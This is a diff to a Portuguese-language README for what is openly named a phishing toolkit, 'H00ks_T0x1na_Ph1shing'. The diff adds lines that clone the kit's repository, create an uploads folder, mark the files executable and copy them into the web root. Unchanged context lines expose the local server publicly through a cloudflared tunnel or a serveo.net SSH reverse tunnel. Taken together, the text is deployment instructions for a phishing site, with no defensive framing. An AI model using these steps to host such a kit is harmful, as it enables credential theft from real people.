@@ -52,6 +52,9 @@ Inicie o servidor cloudflare:
 "cloudflared tunnel --url http://localhost:8080"
 
 Diretorios corretos:
+"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
+"mkdir uploads && cd ../"
+"chmod +x H00ks_T0x1na_Ph1shing/*"
 "sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"
 
 or
@@ -72,6 +75,9 @@ Use o OpenSSH detsa maneira:
 "ssh -R 80:localhost:443 serveo.net"
 
 Diretorios corretos:
+"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
+"mkdir uploads && cd ../"
+"chmod +x H00ks_T0x1na_Ph1shing/*"
 "sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"
 
 
